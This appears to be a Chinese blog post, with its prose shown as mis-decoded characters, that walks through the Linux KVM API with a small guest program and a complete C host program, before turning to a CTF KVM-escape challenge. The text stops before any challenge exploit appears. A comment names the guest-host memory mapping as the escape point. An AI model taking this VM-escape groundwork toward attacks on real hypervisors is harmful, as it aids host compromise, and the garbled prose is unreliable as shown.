          <h1 id="KVMè™šæ‹ŸåŒ–å­¦ä¹ -amp-kvmé¢˜ç›®å¤ç°"><a href="#KVMè™šæ‹ŸåŒ–å­¦ä¹ -amp-kvmé¢˜ç›®å¤ç°" class="headerlink" title="KVMè™šæ‹ŸåŒ–å­¦ä¹ &amp;kvmé¢˜ç›®å¤ç°"></a>KVMè™šæ‹ŸåŒ–å­¦ä¹ &amp;kvmé¢˜ç›®å¤ç°</h1><h2 id="kvmè™šæ‹ŸåŒ–å­¦ä¹ "><a href="#kvmè™šæ‹ŸåŒ–å­¦ä¹ " class="headerlink" title="kvmè™šæ‹ŸåŒ–å­¦ä¹ "></a>kvmè™šæ‹ŸåŒ–å­¦ä¹ </h2><p>å¯¹æˆ‘è€Œè¨€ç°åœ¨å­¦ä¹ è¿™ä¸ªè¿˜æ˜¯æ¯”è¾ƒåƒåŠ›çš„ï¼Œæ¶‰åŠå¾ˆå¤æ‚çš„ä¸€äº›ç†è®ºçŸ¥è¯†ï¼Œçœ‹çš„äº‘é‡Œé›¾é‡Œ(å¤šåŠæ²¡çœ‹æ‡‚)ï¼Œè€Œä¸”èµ„æ–™ä¹Ÿä¸æ˜¯å¾ˆå¤šï¼Œçœ‹äº†ä¸€ä¸¤å¤©å¤§æ¦‚çœ‹æ‡‚äº†kvmçš„æ•´ä¸ªè¿è¡Œè¿‡ç¨‹ï¼Œè™½ç„¶å­¦çš„å¾ˆæµ…ï¼Œä½†æ˜¯åœ¨è¿™é‡Œè®°å½•ä¸€ä¸‹ã€‚</p>
<h3 id="kvmæ¦‚è¿°ä»¥åŠä½¿ç”¨"><a href="#kvmæ¦‚è¿°ä»¥åŠä½¿ç”¨" class="headerlink" title="kvmæ¦‚è¿°ä»¥åŠä½¿ç”¨"></a>kvmæ¦‚è¿°ä»¥åŠä½¿ç”¨</h3><p>kvmæ˜¯è¿è¡Œåœ¨Linuxå†…æ ¸ä¸­çš„ç¡¬ä»¶è™šæ‹ŸåŒ–ç®¡ç†æ¨¡å—ï¼Œç”¨æˆ·æ€çš„ç¨‹åºå¯ä»¥é€šè¿‡kvmæš´éœ²çš„ç”¨æˆ·æ€æ¥å£ä½¿ç”¨ç¡¬ä»¶è™šæ‹ŸåŒ–çš„åŠŸèƒ½,æˆ‘ä»¬å¯ä»¥é€šè¿‡è§„å®šçš„APIä»¥åŠæ•°æ®ç»“æ„å®ŒæˆCPUè™šæ‹ŸåŒ–ï¼Œå†…å­˜è™šæ‹ŸåŒ–ä»¥åŠIOè™šæ‹ŸåŒ–,ä»¥æ­¤æ¨¡æ‹Ÿå®Œæ•´çš„è™šæ‹Ÿç¯å¢ƒã€‚</p>
<p>å…ˆå†™ä¸€æ®µæˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„ä»£ç ,å…¶ä¸­æ¯”è¾ƒé‡è¦çš„æ˜¯<code>out</code>æŒ‡ä»¤ï¼Œè¿™ä¸ªæŒ‡ä»¤å°±æ˜¯æŠŠalä¿å­˜çš„æ•°æ®å‘é€åˆ°dxå‚¨å­˜çš„ioç«¯å£ä¸Šå»ï¼ŒCPUé€šå¸¸é€šè¿‡è¯»å†™è®¾å¤‡å¯„å­˜å™¨çš„æ–¹å¼å’Œè®¾å¤‡è¿›è¡Œé€šä¿¡ï¼Œè®¿é—®è®¾å¤‡å¯„å­˜å™¨çš„æ–¹å¼ä¸€å…±æœ‰ä¸¤ç§ï¼Œä¸€ç§æ˜¯å†…å­˜æ˜ å°„I/O(MMIO)ï¼Œä¸€ç§æ˜¯ç«¯å£æ˜ å°„I/O(PMIO),MMIOæ˜¯å°†è®¾å¤‡å¯„å­˜å™¨ç›´æ¥æ˜ å°„åˆ°å†…å­˜ç©ºé—´ä¸Šå¹¶ä¸”æ‹¥æœ‰ç‹¬ç«‹çš„åœ°å€ï¼ŒCPUå¯ä»¥ç›´æ¥é€šè¿‡è¯»å†™å†…å­˜æŒ‡ä»¤å³å¯é€šä¿¡ï¼Œè€ŒPMIOç»™æ¯ä¸ªè®¾å¤‡åˆ†é…å¯¹åº”çš„ç«¯å£å·ï¼Œç„¶åé€šè¿‡ä¸“é—¨çš„ç«¯å£æ“ä½œæŒ‡ä»¤(out/in)å’Œè®¾å¤‡é€šä¿¡ï¼Œè€Œ0x3f8åˆ™æ˜¯æ¨¡æ‹Ÿçš„ä¸€ä¸ªç«¯å£å·</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov al, 1</span><br><span class="line">add al,&#x27;0&#x27;</span><br><span class="line">mov dx, 0x3f8</span><br><span class="line">out dx, al</span><br><span class="line">hlt</span><br></pre></td></tr></table></figure>

<p>ç„¶åæŠŠè¿™ä¸ªæ±‡ç¼–ç»™ç¼–è¯‘äº†å†å¾—åˆ°äºŒè¿›åˆ¶æ•°æ®</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rootzhang@rootzhang-virtual-machine:~/kvmstudy/test1$ nasm huibian.asm -o huibian</span><br><span class="line">rootzhang@rootzhang-virtual-machine:~/kvmstudy/test1$ hexdump -C huibian</span><br><span class="line">00000000  b0 01 04 30 ba f8 03 ee  f4                       |...0.....|</span><br><span class="line">00000009</span><br></pre></td></tr></table></figure>

<p>ç„¶åæŠŠè¿™ä¸ªshellcodeå­˜å‚¨åˆ°ä¸€ä¸ªæ•°æ®é‡Œ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint8_t</span> code[]=&#123;</span><br><span class="line">     <span class="number">0xb0</span>,<span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x30</span>, <span class="number">0xba</span>, <span class="number">0xf8</span>, <span class="number">0x03</span>, <span class="number">0xee</span>,<span class="number">0xf4</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ¥ç€çœŸæ­£å¼€å§‹åˆ©ç”¨kvmçš„æ¥å£æ¥åˆ›å»ºè™šæ‹Ÿæœºç„¶åè¿è¡Œè¿™æ®µshellcode.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kvm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="keyword">uint8_t</span> code[]=&#123;</span><br><span class="line">         <span class="number">0xb0</span>,<span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x30</span>, <span class="number">0xba</span>, <span class="number">0xf8</span>, <span class="number">0x03</span>, <span class="number">0xee</span>,<span class="number">0xf4</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">//æ‰“å¼€/dev/kvm,è·å¾—kvmçš„å¥æŸ„</span></span><br><span class="line">    <span class="keyword">int</span> kvm=open(<span class="string">&quot;/dev/kvm&quot;</span>,O_RDWR|O_CLOEXEC);</span><br><span class="line">    <span class="comment">//æ—©èµ·çš„kvmçš„APIæ˜¯ä¸ç¨³å®šçš„ï¼Œæ‰€ä»¥å¾—æ£€æŸ¥ä¸€ä¸‹ç‰ˆæœ¬ï¼Œå¦‚æœæ˜¯</span></span><br><span class="line">    <span class="comment">//12é‚£å°±æ²¡é—®é¢˜</span></span><br><span class="line">    ret=ioctl(kvm,KVM_GET_API_VERSION,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span>(ret==<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;KVM_GET_API_VERSION get fail&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(ret!=<span class="number">12</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;KVM_GET_API_VERSION is not 12&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//åˆ›å»ºä¸€ä¸ªè™šæ‹Ÿæœº(vm),ä»–ä»£è¡¨äº†ä¸€ä¸ªæ¨¡æ‹Ÿç³»ç»Ÿç›¸å…³çš„æ‰€æœ‰å†…å®¹ï¼ŒåŒ…æ‹¬</span></span><br><span class="line">    <span class="comment">//å†…å­˜å’Œä¸€ä¸ªæˆ–è€…å¤šä¸ªCPUï¼Œ</span></span><br><span class="line">    <span class="keyword">int</span> vmfd=ioctl(kvm,KVM_CREATE_VM,(<span class="keyword">unsigned</span> <span class="keyword">long</span>)<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(vmfd==<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;KVM_CREATE_VM fail&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//ä¸ºvmé…ç½®â€œç‰©ç†â€å†…å­˜</span></span><br><span class="line">    <span class="keyword">void</span> *mem=mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(!mem)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;mmap mem fail&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(mem,code,<span class="keyword">sizeof</span>(code));</span><br><span class="line">    <span class="comment">//è¿™ä¸ªæ•°æ®ç»“æ„è§„å®šäº†å®¢æˆ·ç‰©ç†åœ°å€å’Œå®¿ä¸»è¿›ç¨‹çš„æ˜ å°„å…³ç³»,æ˜¯æ¯”è¾ƒé‡è¦çš„</span></span><br><span class="line">    <span class="comment">//å…¶ä¸­guest_phys_addræŒ‡å®šäº†ä»guestçœ‹åˆ°çš„&quot;ç‰©ç†&quot;åœ°å€ï¼Œè€Œuserspace_addr</span></span><br><span class="line">    <span class="comment">//æ˜¯å®¿ä¸»è¿›ç¨‹çš„è™šæ‹Ÿåœ°å€ï¼Œå¯ä»¥çœ‹å‡ºè¿™ä¸ªæ˜¯ä¸ªçº¿æ€§æ˜ å°„ï¼ŒæŠŠmemæ˜ å°„åˆ°guestçš„0x1000</span></span><br><span class="line">    <span class="comment">//çš„â€œç‰©ç†â€åœ°å€ä¸Šï¼Œæ‰€ä»¥memå’Œguestçš„0x1000æŒ‡å‘åˆ°çœŸå®ç‰©ç†åœ°å€æ˜¯ä¸€æ¨¡ä¸€æ ·çš„ï¼Œæ‰€ä»¥guestä¿®æ”¹</span></span><br><span class="line">    <span class="comment">//ä»–çš„å†…å­˜æ˜¯å¯ä»¥å½±å“åˆ°å®¿ä¸»è¿›ç¨‹çš„ï¼Œè¿™ä¹Ÿæ˜¯é€ƒé€¸çš„æ¼æ´ç‚¹ã€‚</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kvm_userspace_memory_region</span> <span class="title">region</span>=</span>&#123;</span><br><span class="line">        .slot=<span class="number">0</span>,</span><br><span class="line">        .guest_phys_addr=<span class="number">0x1000</span>,</span><br><span class="line">        .memory_size=<span class="number">0x1000</span>,</span><br><span class="line">        .userspace_addr=(<span class="keyword">uint64_t</span>)mem,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">//ç„¶åè®¾ç½®vmçš„å†…å­˜åŒºåŸŸ</span></span><br><span class="line">    ret=ioctl(vmfd,KVM_SET_USER_MEMORY_REGION,&amp;region);</span><br><span class="line">    <span class="keyword">if</span>(ret==<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;KVM_SET_USER_MEMORY_REGION fail&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//æˆªè‡³ç›®å‰å·²ç»æ‹¥æœ‰äº†vmå’Œä»–æ‰€å¯¹åº”çš„å†…å­˜ï¼Œé‡Œé¢åŒ…å«äº†ä»£ç ï¼Œè¦æƒ³æ‰§è¡Œè¿™æ®µä»£ç è¿˜å¾—æ¨¡æ‹Ÿ</span></span><br><span class="line">    <span class="comment">//ä¸€ä¸ªè™šæ‹ŸCPU(VCPU),ä¸€ä¸ªè™šæ‹Ÿcpuä»£è¡¨äº†ä¸€ä¸ªæ¨¡æ‹ŸCPUçš„çŠ¶æ€ï¼ŒåŒ…æ‹¬å¤„ç†å™¨å¯„å­˜å™¨å’Œå…¶ä»–</span></span><br><span class="line">    <span class="comment">//æ‰§è¡ŒçŠ¶æ€,kvmæä¾›ä¸€ä¸ªvcpuçš„å¥æŸ„</span></span><br><span class="line">    <span class="keyword">int</span> vcpufd=ioctl(vmfd,KVM_CREATE_VCPU,(<span class="keyword">unsigned</span> <span class="keyword">long</span>)<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(vcpufd==<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;KVM_CREATE_VCPU fail&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//æ¯ä¸ªvcpuéƒ½å¾—å…³è”ä¸€ä¸ªstruct kvm_runæ•°æ®ç»“æ„ï¼Œç”¨äºåœ¨vmå’Œå®¿ä¸»è¿›ç¨‹(æˆ‘ç†è§£ä¸ºè™šæ‹Ÿæœºç›‘å¬å™¨)</span></span><br><span class="line">    <span class="comment">//ä¼ é€’æœ‰å…³cpuçš„ä¿¡æ¯ï¼Œç‰¹åˆ«æ˜¯å½“vmexitçš„æ—¶å€™ï¼Œkvm_runè®²åŒ…å«æœ‰å…³ä»–åœæ­¢çš„ä¿¡æ¯ï¼Œå¯ä»¥æ ¹æ®è¿™ä¸ª</span></span><br><span class="line">    <span class="comment">//ä¿¡æ¯åšç›¸åº”çš„å¤„ç†æ“ä½œ</span></span><br><span class="line">    <span class="keyword">size_t</span> kvm_run_size=ioctl(kvm,KVM_GET_VCPU_MMAP_SIZE,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span>(!kvm_run_size)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;KVM_GET_VCPU_MMAP_SIZE fail&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//ç„¶åå°†kvm_runå’Œvcpuå…³è”</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kvm_run</span> *<span class="title">run</span>=</span>mmap(<span class="literal">NULL</span>,kvm_run_size,PROT_READ | PROT_WRITE, MAP_SHARED, vcpufd, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//åœ¨æ‰§è¡Œä»£ç ä¹‹å‰è¿˜éœ€è¦è®¾ç½®vcpuçš„å¯„å­˜å™¨çš„åˆå§‹çŠ¶æ€ï¼Œå¯„å­˜å™¨åˆ†ä¸ºæ ‡å‡†å¯„å­˜å™¨å’Œç‰¹æ®Šå¯„å­˜å™¨ï¼Œæ ‡å‡†</span></span><br><span class="line">    <span class="comment">//å¯„å­˜å™¨æŒ‡çš„æ˜¯é€šç”¨å¯„å­˜å™¨ä»¥åŠæŒ‡é’ˆå’Œæ ‡å¿—ï¼Œkvmä¸­é‡‡ç”¨struct kvm_regsæ•°æ®ç»“æ„ä¸å…¶å¯¹åº”ï¼Œç‰¹æ®Šå¯„å­˜å™¨</span></span><br><span class="line">    <span class="comment">//ä¸»è¦åŒ…æ‹¬æ®µå¯„å­˜å™¨å’Œæ§åˆ¶å¯„å­˜å™¨,kvmä¸­é‡‡ç”¨struct kvm_sregsæ•°æ®ç»“æ„ä¸å…¶å¯¹åº”</span></span><br><span class="line">    <span class="comment">//ç‰¹æ®Šå¯„å­˜å™¨ä¸­ï¼Œæˆ‘ä»¬åªéœ€è¦è®¾ç½®cså¯„å­˜å™¨å³å¯</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kvm_sregs</span> <span class="title">sregs</span>;</span></span><br><span class="line">    ret=ioctl(vcpufd,KVM_GET_SREGS,&amp;sregs);</span><br><span class="line">    <span class="keyword">if</span>(ret==<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;KVM_GET_SREGS fail&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    sregs.cs.base = <span class="number">0</span>;</span><br><span class="line">    sregs.cs.selector = <span class="number">0</span>;</span><br><span class="line">    ret=ioctl(vcpufd,KVM_SET_SREGS,&amp;sregs);</span><br><span class="line">    <span class="keyword">if</span>(ret==<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;KVM_SET_SREGS fail&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//è®¾ç½®æ ‡å‡†å¯„å­˜å™¨ï¼Œå…¶ä¸­æ¯”è¾ƒé‡è¦çš„æ˜¯ripå’Œrflagså¯„å­˜å™¨ï¼ŒripæŒ‡å‘</span></span><br><span class="line">    <span class="comment">//codeå­˜æ”¾çš„åœ°å€ï¼ŒrflagsæŒ‡å®šä¸º2</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kvm_regs</span> <span class="title">regs</span>=</span></span><br><span class="line">    &#123;</span><br><span class="line">        .rip=<span class="number">0x1000</span>,</span><br><span class="line">        .rax=<span class="number">1</span>,</span><br><span class="line">        .rflags=<span class="number">0x2</span>,</span><br><span class="line"></span><br><span class="line">    &#125;;</span><br><span class="line">    ret=ioctl(vcpufd,KVM_SET_REGS,&amp;regs);</span><br><span class="line">    <span class="keyword">if</span>(ret==<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;KVM_SET_REGS fail&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//æ­¤æ—¶vmæ‹¥æœ‰äº†å†…å­˜å’ŒVCPUï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨KVM_runé€‰é¡¹è®©vcpuæ¥è¿è¡Œè‡ªå·±çš„</span></span><br><span class="line">    <span class="comment">//codeäº†</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ret=ioctl(vcpufd,KVM_RUN,<span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret==<span class="number">-1</span>)&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;KVM_RUN fail&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">switch</span> (run-&gt;exit_reason)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> KVM_EXIT_HLT:</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;KVM_EXIT_HLT hahaha&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> KVM_EXIT_IO:</span><br><span class="line">            <span class="keyword">if</span>(</span><br><span class="line">                run-&gt;io.direction==KVM_EXIT_IO_OUT&amp;&amp;</span><br><span class="line">                run-&gt;io.size==<span class="number">1</span>&amp;&amp;</span><br><span class="line">                run-&gt;io.port==<span class="number">0x3f8</span>&amp;&amp;</span><br><span class="line">                run-&gt;io.count==<span class="number">1</span></span><br><span class="line">            )&#123;</span><br><span class="line">                <span class="built_in">putchar</span>(*(( (<span class="keyword">char</span> *)run)+run-&gt;io.data_offset));</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;KVM_EXIT_IO fail&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç»“æœ</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rootzhang@rootzhang-virtual-machine:~/kvmstudy/test1$ ./kvmpwn </span><br><span class="line">1KVM_EXIT_HLT hahaha</span><br></pre></td></tr></table></figure>

<p>ç¬¦åˆé¢„æœŸ</p>
<p>éªŒè¯ä¸€ä¸‹guestè¢«åˆ†é…çš„å†…å­˜æ˜¯å¦æ˜¯å®¿ä¸»è¿›ç¨‹ç»™ä»–çš„</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mov al, 1</span><br><span class="line">add al,&#x27;0&#x27;</span><br><span class="line">mov dx, 0x3f8</span><br><span class="line">out dx, al</span><br><span class="line">mov al,0x20</span><br><span class="line">mov word [0x1000+0x20],&#x27;2&#x27;</span><br><span class="line">hlt</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> KVM_EXIT_HLT:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,((<span class="keyword">char</span> *)mem)+<span class="number">0x20</span>);</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;KVM_EXIT_HLT hahaha&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>

<p>ç»“æœ</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rootzhang@rootzhang-virtual-machine:~/kvmstudy/test1$ ./kvmpwn</span><br><span class="line">12</span><br><span class="line">KVM_EXIT_HLT hahaha</span><br></pre></td></tr></table></figure>

<p>ç¬¦åˆé¢„æœŸ</p>
<h3 id="kvmæ·±å…¥å­¦ä¹ "><a href="#kvmæ·±å…¥å­¦ä¹ " class="headerlink" title="kvmæ·±å…¥å­¦ä¹ "></a>kvmæ·±å…¥å­¦ä¹ </h3><p>â€‹    ä¸Šé¢åªæ˜¯æ¯”è¾ƒç®€å•çš„kvmä½¿ç”¨æ–¹æ³•ï¼Œguestå¹¶æ²¡æœ‰å¼€è™šæ‹Ÿå†…å­˜æ˜ å°„ï¼Œç›´æ¥ä½¿ç”¨çš„æ˜¯ä»–çš„â€ç‰©ç†åœ°å€â€ï¼Œæ‰€ä»¥æ¯”è¾ƒå¥½ç†è§£ï¼Œæˆ‘æ‰¾è§äº†conf2020çš„ä¸€é“kvmæºç ï¼Œä»–æ•´äº†å¾ˆå¤šèŠ±æ´»ï¼Œæˆ‘ç¨å¾®æ”¹äº†æ”¹è®©ä»–èƒ½å¤Ÿè·‘èµ·æ¥ï¼Œæ¥ä¸‹æ¥çš„ä»»åŠ¡å°±æ˜¯ææ‡‚è¿™ä¸ªæºä»£ç </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span 